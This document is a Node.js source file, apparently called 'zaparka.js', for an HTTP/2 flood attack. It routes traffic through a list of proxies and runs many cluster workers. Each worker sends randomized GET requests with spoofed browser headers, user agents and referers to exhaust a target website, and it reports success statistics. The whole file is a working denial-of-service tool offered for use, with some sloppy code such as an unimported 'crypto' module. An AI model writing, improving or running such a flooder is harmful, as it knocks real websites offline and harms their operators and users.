const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

if (process.argv.length < 7){
    console.log(`node zaparka.js target time rate thread proxyfile`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

// Счетчики для логирования
let requestCount = 0;
let successCount = 0;
let errorCount = 0;
let statusCodes = {};

// Логирование статистики с обновлением экрана
setInterval(() => {
    process.stdout.write('\x1Bc'); // Очистка экрана
    console.log(`[${new Date().toISOString()}] Stats:`);
    console.log(`  Total Requests: ${requestCount}`);
    console.log(`  Success: ${successCount}`);
    console.log(`  Errors: ${errorCount}`);
    console.log(`  Status Codes:`, statusCodes);
    console.log(`  Success Rate: ${requestCount > 0 ? ((successCount / requestCount) * 100).toFixed(2) : 0}%`);
}, 1000);

if (cluster.isMaster) {
    console.log(`[Master] Starting ${args.threads} workers...`);
    console.log(`[Master] Target: ${args.target}`);
    console.log(`[Master] Duration: ${args.time}s`);
    console.log(`[Master] Rate: ${args.Rate} req/s per worker`);
    console.log('---');
    
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 1);
}

class NetSocket {
    constructor(){}

    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const fetch_site = ["same-origin", "same-site", "cross-site"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "worker"];

const languages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "es-ES,es;q=0.9",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8"
];

const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0"
];

const referers = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.yahoo.com/",
    "https://www.baidu.com/",
    ""
];

const Header = new NetSocket();

function buildHeaders() {
    const rand_query = "?" + randomString(12) + "=" + randomIntn(100000, 999999);
    const rand_path = (parsedTarget.path || "/") + rand_query;

    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": rand_path,
        "user-agent": randomElement(useragents),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": randomElement(languages),
        "accept-encoding": "gzip, deflate, br, zstd",
        "sec-fetch-site": randomElement(fetch_site),
        "sec-fetch-dest": randomElement(fetch_dest),
        "sec-fetch-mode": randomElement(fetch_mode),
        "upgrade-insecure-requests": "1",
        "te": "trailers"
    };

    const ref = randomElement(referers);
    if (ref) headers["referer"] = ref;

    if (Math.random() > 0.5) {
        headers["dnt"] = "1";
    }

    if (Math.random() > 0.7) {
        headers["sec-ch-ua"] = `"Chromium";v="${randomIntn(130, 131)}", "Not_A Brand";v="8"`;
        headers["sec-ch-ua-mobile"] = "?0";
        headers["sec-ch-ua-platform"] = randomElement(['"Windows"', '"macOS"', '"Linux"']);
    }

    return headers;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    if (!proxyAddr || !proxyAddr.includes(":")) return;

    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 1
    };

    Header.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 60000);

        const tlsOptions = {
            ALPNProtocols: ['h2', 'http/1.1'],
            followAllRedirects: true,
            challengeToSolve: Infinity,
            clientTimeout: 5000,
            clientlareMaxTimeout: 15000,
            ecdhCurve: "X25519:prime256v1:secp384r1:secp521r1",
            honorCipherOrder: true,
            rejectUnauthorized: false,
            secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | 
                          crypto.constants.SSL_OP_NO_SSLv3 | 
                          crypto.constants.SSL_OP_NO_TLSv1 |
                          crypto.constants.SSL_OP_NO_TLSv1_1,
            secure: true,
            ciphers: [
                "TLS_AES_128_GCM_SHA256",
                "TLS_AES_256_GCM_SHA384",
                "TLS_CHACHA20_POLY1305_SHA256",
                "ECDHE-RSA-AES128-GCM-SHA256",
                "ECDHE-ECDSA-AES128-GCM-SHA256",
                "ECDHE-RSA-AES256-GCM-SHA384",
                "ECDHE-ECDSA-AES256-GCM-SHA384"
            ].join(':'),
            sigalgs: [
                "ecdsa_secp256r1_sha256",
                "ecdsa_secp384r1_sha384",
                "ecdsa_secp521r1_sha512",
                "rsa_pss_rsae_sha256",
                "rsa_pss_rsae_sha384",
                "rsa_pss_rsae_sha512",
                "rsa_pkcs1_sha256",
                "rsa_pkcs1_sha384",
                "rsa_pkcs1_sha512"
            ].join(':'),
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            socket: connection,
            servername: parsedTarget.host,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60 * 10000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                maxConcurrentStreams: 200,
                initialWindowSize: 65535,
                enablePush: false,
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        let IntervalAttack = null;

        client.on("connect", () => {
            IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const headers = buildHeaders();
                    const request = client.request(headers);

                    requestCount++;

                    request.on("response", (headers) => {
                        const statusCode = headers[':status'];
                        successCount++;
                        
                        // Подсчет статус-кодов
                        if (statusCodes[statusCode]) {
                            statusCodes[statusCode]++;
                        } else {
                            statusCodes[statusCode] = 1;
                        }

                        request.close();
                        request.destroy();
                    });

                    request.on("error", (err) => {
                        errorCount++;
                        request.destroy();
                    });

                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            if (IntervalAttack) clearInterval(IntervalAttack);
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });

        client.on("error", () => {
            if (IntervalAttack) clearInterval(IntervalAttack);
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });

        tlsConn.on("error", () => {
            if (IntervalAttack) clearInterval(IntervalAttack);
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });

        tlsConn.on("end", () => {
            if (IntervalAttack) clearInterval(IntervalAttack);
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });
    });
}

const KillScript = () => {
    console.log('\n[FINAL STATS]');
    console.log(`Total Requests: ${requestCount}`);
    console.log(`Success: ${successCount}`);
    console.log(`Errors: ${errorCount}`);
    console.log(`Status Codes:`, statusCodes);
    console.log(`Success Rate: ${requestCount > 0 ? ((successCount / requestCount) * 100).toFixed(2) : 0}%`);
    process.exit(1);
};

setTimeout(KillScript, args.time * 1000);